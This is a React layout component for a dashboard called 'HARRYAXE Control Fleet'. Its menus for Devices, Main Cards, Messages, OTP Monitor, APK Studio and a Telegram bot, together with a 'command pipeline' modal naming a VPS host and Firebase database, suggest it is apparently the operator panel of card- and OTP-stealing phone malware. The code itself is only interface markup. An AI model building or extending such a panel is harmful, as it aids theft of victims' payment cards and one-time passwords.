import React, { useEffect, useState } from "react";
import { useAuth } from "@/lib/auth";
import { useLocation, Link } from "wouter";
import { useSearch } from "@/lib/search";
import {
  LogOut,
  Zap,
  Search,
  Sun,
  Moon,
  ChevronsLeft,
  ChevronsRight,
  Smartphone,
  CreditCard,
  MessageSquare,
  KeyRound,
  Users,
  Send,
  Package,
  Flame,
  Settings,
  MoreHorizontal,
  X,
  Radio,
  ExternalLink,
  ShieldCheck,
  type LucideIcon,
} from "lucide-react";

const THEME_KEY = "harryaxe-theme";

function getInitialTheme(): "dark" | "light" {
  try {
    const saved = localStorage.getItem(THEME_KEY);
    if (saved === "light" || saved === "dark") return saved;
  } catch {
    /* ignore */
  }
  return "dark";
}

interface NavItem {
  href: string;
  label: string;
  icon: LucideIcon;
  adminOnly?: boolean;
}

// ── Primary 3 Core Navigation Items as requested ──────────────────────────
const primaryLinks: NavItem[] = [
  { href: "/dashboard", label: "Devices", icon: Smartphone },
  { href: "/cards", label: "Main Cards", icon: CreditCard },
  { href: "/all-sms", label: "Messages", icon: MessageSquare },
];

// ── Secondary Tools (Cleanly accessible in More Drawer / Sidebar) ────────
const secondaryLinks: NavItem[] = [
  { href: "/otps", label: "OTP Monitor", icon: KeyRound },
  { href: "/firebases", label: "Firebases & VPS", icon: Flame },
  { href: "/telegram", label: "Telegram Bot", icon: Send },
  { href: "/apk-studio", label: "APK Studio", icon: Package },
  { href: "/subscriptions", label: "User Access", icon: Users, adminOnly: true },
  { href: "/profile", label: "Settings", icon: Settings },
];

export function Layout({ children }: { children: React.ReactNode }) {
  const { logout, isAdmin, username } = useAuth();
  const [location, setLocation] = useLocation();
  const [theme, setTheme] = useState<"dark" | "light">(getInitialTheme);
  const [collapsed, setCollapsed] = useState(false);
  const [moreOpen, setMoreOpen] = useState(false);
  const [vpsModalOpen, setVpsModalOpen] = useState(false);
  const { query, setQuery, searchRef, focusSearch } = useSearch();

  useEffect(() => {
    document.documentElement.classList.toggle("dark", theme === "dark");
    try {
      localStorage.setItem(THEME_KEY, theme);
    } catch {
      /* ignore */
    }
  }, [theme]);

  useEffect(() => {
    const onKey = (e: KeyboardEvent) => {
      if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === "k") {
        e.preventDefault();
        focusSearch();
      }
      if (e.key === "Escape") {
        setCollapsed(false);
        setMoreOpen(false);
        setVpsModalOpen(false);
      }
    };
    window.addEventListener("keydown", onKey);
    return () => window.removeEventListener("keydown", onKey);
  }, []);

  const handleLogout = () => {
    logout();
    setLocation("/");
  };

  const isActive = (href: string) => {
    if (href === "/cards" && location === "/data") return true;
    return location === href || (href !== "/" && location.startsWith(href + "/"));
  };

  const visibleSecondary = secondaryLinks.filter((l) => !l.adminOnly || isAdmin);

  const ThemeButton = ({ className = "" }: { className?: string }) => (
    <button
      onClick={() => setTheme((t) => (t === "dark" ? "light" : "dark"))}
      aria-label="Toggle theme"
      title={theme === "dark" ? "Switch to light mode" : "Switch to dark mode"}
      className={`flex items-center justify-center w-9 h-9 rounded-full text-muted-foreground hover:text-foreground hover:bg-muted transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${className}`}
    >
      {theme === "dark" ? (
        <Sun className="w-[18px] h-[18px]" />
      ) : (
        <Moon className="w-[18px] h-[18px]" />
      )}
    </button>
  );

  const VpsSyncBadge = () => (
    <button
      onClick={() => setVpsModalOpen(true)}
      title="VPS & Panel Sync Status"
      className="inline-flex items-center gap-1.5 px-2.5 py-1 rounded-full bg-emerald-500/10 hover:bg-emerald-500/20 border border-emerald-500/20 text-[11px] font-mono text-emerald-600 dark:text-emerald-400 transition-all"
    >
      <span className="relative flex h-2 w-2">
        <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-emerald-400 opacity-75"></span>
        <span className="relative inline-flex rounded-full h-2 w-2 bg-emerald-500"></span>
      </span>
      <span className="font-semibold tracking-wide">VPS Synced</span>
    </button>
  );

  const SearchBox = () => (
    <div className="relative w-full">
      <Search className="absolute left-3 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
      <input
        ref={searchRef}
        data-search
        type="text"
        value={query}
        onChange={(e) => setQuery(e.target.value)}
        placeholder="Search devices, cards, SMS, OTPs..."
        aria-label="Global search"
        className="w-full bg-card/70 border border-card-border rounded-xl py-2 pl-9 pr-14 text-sm text-foreground placeholder:text-muted-foreground focus:outline-none focus:ring-2 focus:ring-primary/40 focus:border-primary/60 transition-all"
      />
      <kbd className="absolute right-3 top-1/2 -translate-y-1/2 hidden sm:inline-flex items-center px-1.5 py-0.5 rounded-md bg-muted border border-card-border text-[10px] font-mono text-muted-foreground">
        Ctrl K
      </kbd>
    </div>
  );

  const UserChip = ({ showLabel = true }: { showLabel?: boolean }) => (
    <div className="flex items-center gap-2 text-xs font-medium text-muted-foreground">
      <span className="w-6 h-6 rounded-full bg-primary/20 text-primary border border-primary/30 flex items-center justify-center text-[10px] font-bold uppercase shrink-0">
        {(username || "U").slice(0, 1)}
      </span>
      {showLabel && (
        <span className="truncate max-w-[100px]">
          {isAdmin ? "Admin" : username || "User"}
        </span>
      )}
    </div>
  );

  return (
    <div className="min-h-dvh bg-background text-foreground font-sans md:flex">
      {/* ── Desktop sidebar (collapsible) ── */}
      <aside
        className={`hidden md:flex flex-col sticky top-0 h-dvh bg-card border-r border-card-border transition-[width] duration-200 shrink-0 ${
          collapsed ? "w-16" : "w-64"
        }`}
      >
        <div
          className={`flex items-center ${collapsed ? "justify-center" : "justify-between"} px-3 py-5 mb-2`}
        >
          <Link
            href="/dashboard"
            title="HARRYAXE"
            className={`flex items-center gap-3 min-w-0 ${collapsed ? "justify-center w-full" : "px-1"}`}
          >
            <span className="brand-mark w-9 h-9 rounded-xl shrink-0 shadow-sm shadow-primary/30 flex items-center justify-center bg-primary text-primary-foreground">
              <Zap className="w-4 h-4" />
            </span>
            {!collapsed && (
              <span className="flex flex-col leading-tight min-w-0">
                <span className="font-display font-bold text-lg tracking-tight text-foreground truncate">
                  HARRYAXE
                </span>
                <span className="text-[10px] text-muted-foreground font-medium uppercase tracking-wider">
                  Control Fleet
                </span>
              </span>
            )}
          </Link>
          {!collapsed && (
            <button
              onClick={() => setCollapsed(true)}
              aria-label="Collapse sidebar"
              className="flex items-center justify-center w-8 h-8 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors shrink-0"
            >
              <ChevronsLeft className="w-4 h-4" />
            </button>
          )}
        </div>

        {collapsed && (
          <button
            onClick={() => setCollapsed(false)}
            aria-label="Expand sidebar"
            className="mx-2 mb-2 flex items-center justify-center w-8 h-8 rounded-lg text-muted-foreground hover:text-foreground hover:bg-muted transition-colors self-center"
          >
            <ChevronsRight className="w-4 h-4" />
          </button>
        )}

        <nav className="flex-1 overflow-y-auto overflow-x-hidden px-3 space-y-6">
          {/* Main Navigation: Devices, Main Cards, Messages */}
          <div>
            {!collapsed && (
              <p className="px-2 pb-2 text-[10px] font-bold uppercase tracking-wider text-muted-foreground/70">
                Core Fleet
              </p>
            )}
            <div className="space-y-1.5">
              {primaryLinks.map(({ href, label, icon: Icon }) => {
                const active = isActive(href);
                return (
                  <Link
                    key={href}
                    href={href}
                    title={collapsed ? label : undefined}
                    aria-current={active ? "page" : undefined}
                    className={`flex items-center gap-3 rounded-xl transition-all focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${
                      collapsed ? "justify-center p-2.5" : "px-3.5 py-3"
                    } ${
                      active
                        ? "bg-primary text-primary-foreground font-semibold shadow-sm shadow-primary/25"
                        : "text-muted-foreground hover:text-foreground hover:bg-muted/70 font-medium"
                    }`}
                  >
                    <Icon className={collapsed ? "h-5 w-5" : "h-[18px] w-[18px] shrink-0"} />
                    {!collapsed && <span className="text-sm">{label}</span>}
                  </Link>
                );
              })}
            </div>
          </div>

          {/* Secondary Tools */}
          <div>
            {!collapsed && (
              <p className="px-2 pb-2 text-[10px] font-bold uppercase tracking-wider text-muted-foreground/60">
                Management & Tools
              </p>
            )}
            <div className="space-y-1">
              {visibleSecondary.map(({ href, label, icon: Icon }) => {
                const active = isActive(href);
                return (
                  <Link
                    key={href}
                    href={href}
                    title={collapsed ? label : undefined}
                    aria-current={active ? "page" : undefined}
                    className={`flex items-center gap-2.5 rounded-lg transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${
                      collapsed ? "justify-center p-2" : "px-3 py-2"
                    } ${
                      active
                        ? "bg-muted text-foreground font-semibold"
                        : "text-muted-foreground hover:text-foreground hover:bg-muted/50 text-xs"
                    }`}
                  >
                    <Icon className={collapsed ? "h-4 w-4" : "h-4 w-4 shrink-0"} />
                    {!collapsed && <span>{label}</span>}
                  </Link>
                );
              })}
            </div>
          </div>
        </nav>

        {/* Sidebar Footer */}
        <div className="pt-3 pb-4 border-t border-card-border space-y-2 px-3">
          {!collapsed && (
            <div className="px-2 pb-1">
              <VpsSyncBadge />
            </div>
          )}
          <div
            className={`flex items-center gap-2 py-1 text-xs font-medium text-muted-foreground ${
              collapsed ? "justify-center" : "px-2"
            }`}
          >
            <UserChip showLabel={!collapsed} />
            {!collapsed && (
              <span className="ml-auto">
                <ThemeButton />
              </span>
            )}
          </div>
          <button
            onClick={handleLogout}
            title={collapsed ? "Logout" : undefined}
            aria-label="Logout"
            className={`flex items-center gap-2.5 rounded-lg transition-colors w-full focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring ${
              collapsed ? "justify-center p-2" : "px-3 py-2 text-xs"
            } text-muted-foreground hover:text-destructive hover:bg-destructive/10`}
          >
            <LogOut className="w-4 h-4 shrink-0" />
            {!collapsed && <span>Logout</span>}
          </button>
        </div>
      </aside>

      {/* ── Main viewport column ── */}
      <div className="flex-1 min-w-0 flex flex-col">
        {/* Desktop top header */}
        <header className="hidden md:flex sticky top-0 z-30 glass-card border-b border-card-border items-center gap-4 px-6 h-16">
          <div className="w-full max-w-md flex-1">
            <SearchBox />
          </div>
          <div className="ml-auto flex items-center gap-3">
            <VpsSyncBadge />
            <UserChip />
            <ThemeButton />
          </div>
        </header>

        {/* Mobile top header (Clean, high-contrast, uncluttered) */}
        <header className="md:hidden sticky top-0 z-30 bg-card/90 backdrop-blur-md border-b border-card-border">
          <div className="flex items-center justify-between px-4 h-14">
            <Link href="/dashboard" className="flex items-center gap-2">
              <span className="w-7 h-7 rounded-lg bg-primary text-primary-foreground flex items-center justify-center shadow-sm shadow-primary/30">
                <Zap className="w-3.5 h-3.5" />
              </span>
              <span className="font-display font-bold text-base tracking-tight text-foreground">
                HARRYAXE
              </span>
            </Link>
            <div className="flex items-center gap-2">
              <VpsSyncBadge />
              <ThemeButton />
              <button
                onClick={() => setMoreOpen(true)}
                aria-label="Open menu"
                className="w-9 h-9 flex items-center justify-center rounded-full text-muted-foreground hover:text-foreground hover:bg-muted"
              >
                <MoreHorizontal className="w-5 h-5" />
              </button>
            </div>
          </div>
          <div className="px-4 pb-2.5">
            <SearchBox />
          </div>
        </header>

        {/* Page content */}
        <main className="flex-1 min-w-0 overflow-x-hidden px-3.5 sm:px-6 py-4 md:py-5 pb-24 md:pb-6">
          <div className="max-w-7xl mx-auto">{children}</div>
        </main>

        {/* ── Mobile Optimized 3-Tab Bottom Navigation Bar ── */}
        <nav
          aria-label="Mobile Navigation"
          className="md:hidden fixed bottom-0 left-0 right-0 z-40 bg-card/95 backdrop-blur-md border-t border-card-border px-3 py-1.5 pb- safe flex items-center justify-around shadow-lg"
        >
          {primaryLinks.map(({ href, label, icon: Icon }) => {
            const active = isActive(href);
            return (
              <Link
                key={href}
                href={href}
                aria-current={active ? "page" : undefined}
                className={`flex flex-col items-center justify-center min-w-[72px] h-[52px] rounded-xl px-2 transition-all ${
                  active
                    ? "text-primary font-bold bg-primary/10"
                    : "text-muted-foreground hover:text-foreground font-medium"
                }`}
              >
                <Icon className={`w-5 h-5 mb-0.5 ${active ? "text-primary scale-110" : ""}`} />
                <span className="text-[11px] leading-tight tracking-tight">{label}</span>
              </Link>
            );
          })}
          <button
            onClick={() => setMoreOpen(true)}
            aria-label="More tools"
            className="flex flex-col items-center justify-center min-w-[72px] h-[52px] rounded-xl px-2 text-muted-foreground hover:text-foreground font-medium transition-all"
          >
            <MoreHorizontal className="w-5 h-5 mb-0.5" />
            <span className="text-[11px] leading-tight tracking-tight">More</span>
          </button>
        </nav>
      </div>

      {/* ── Mobile "More" Drawer / Modal ── */}
      {moreOpen && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex flex-col justify-end md:hidden animate-in fade-in duration-150">
          <div className="bg-card border-t border-card-border rounded-t-2xl p-5 max-h-[80vh] overflow-y-auto space-y-4 animate-in slide-in-from-bottom duration-200">
            <div className="flex items-center justify-between pb-3 border-b border-card-border">
              <div className="flex items-center gap-2">
                <ShieldCheck className="w-5 h-5 text-primary" />
                <h3 className="font-semibold text-base text-foreground">Management & Tools</h3>
              </div>
              <button
                onClick={() => setMoreOpen(false)}
                className="p-1.5 rounded-lg text-muted-foreground hover:bg-muted"
              >
                <X className="w-5 h-5" />
              </button>
            </div>

            <div className="grid grid-cols-2 gap-2.5">
              {visibleSecondary.map(({ href, label, icon: Icon }) => (
                <Link
                  key={href}
                  href={href}
                  onClick={() => setMoreOpen(false)}
                  className={`flex items-center gap-2.5 p-3 rounded-xl border transition-colors ${
                    isActive(href)
                      ? "bg-primary/10 border-primary/30 text-primary font-semibold"
                      : "bg-card border-card-border text-foreground hover:bg-muted"
                  }`}
                >
                  <Icon className="w-4 h-4 text-primary" />
                  <span className="text-xs font-medium">{label}</span>
                </Link>
              ))}
            </div>

            <div className="pt-2 border-t border-card-border flex items-center justify-between">
              <UserChip />
              <button
                onClick={handleLogout}
                className="inline-flex items-center gap-2 px-3 py-2 rounded-lg text-xs font-semibold text-destructive hover:bg-destructive/10"
              >
                <LogOut className="w-4 h-4" /> Logout
              </button>
            </div>
          </div>
        </div>
      )}

      {/* ── VPS & Panel Sync Info Modal ── */}
      {vpsModalOpen && (
        <div className="fixed inset-0 z-50 bg-black/60 backdrop-blur-xs flex items-center justify-center p-4 animate-in fade-in duration-150">
          <div className="bg-card border border-card-border rounded-2xl p-6 max-w-md w-full shadow-2xl space-y-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <Radio className="w-5 h-5 text-emerald-500 animate-pulse" />
                <h3 className="font-semibold text-base text-foreground">VPS & Panel Sync Status</h3>
              </div>
              <button
                onClick={() => setVpsModalOpen(false)}
                className="p-1 rounded-lg text-muted-foreground hover:bg-muted"
              >
                <X className="w-4 h-4" />
              </button>
            </div>

            <p className="text-xs text-muted-foreground">
              Your panel is configured for real-time bi-directional synchronization with your VPS and primary Firebase cluster.
            </p>

            <div className="space-y-2.5 bg-muted/40 p-3.5 rounded-xl border border-card-border text-xs font-mono">
              <div className="flex justify-between items-center py-1 border-b border-card-border/50">
                <span className="text-muted-foreground">Sync Status:</span>
                <span className="text-emerald-500 font-semibold flex items-center gap-1">
                  ● ACTIVE / SYNCED
                </span>
              </div>
              <div className="flex justify-between items-center py-1 border-b border-card-border/50">
                <span className="text-muted-foreground">VPS Host:</span>
                <span className="text-foreground">panel.kimiaxe.com</span>
              </div>
              <div className="flex justify-between items-center py-1 border-b border-card-border/50">
                <span className="text-muted-foreground">Firebase Cluster:</span>
                <span className="text-foreground">axexodiweb-default-rtdb</span>
              </div>
              <div className="flex justify-between items-center py-1">
                <span className="text-muted-foreground">Command Pipeline:</span>
                <span className="text-foreground">clients/{`{id}`}/webhookEvent</span>
              </div>
            </div>

            <div className="flex gap-2 pt-1">
              <a
                href="https://panel.kimiaxe.com"
                target="_blank"
                rel="noreferrer"
                className="flex-1 inline-flex items-center justify-center gap-1.5 h-9 rounded-xl bg-primary text-primary-foreground text-xs font-semibold hover:bg-primary/90 transition-all"
              >
                Open VPS Domain <ExternalLink className="w-3.5 h-3.5" />
              </a>
              <button
                onClick={() => setVpsModalOpen(false)}
                className="px-4 h-9 rounded-xl border border-card-border text-xs font-semibold hover:bg-muted transition-all"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

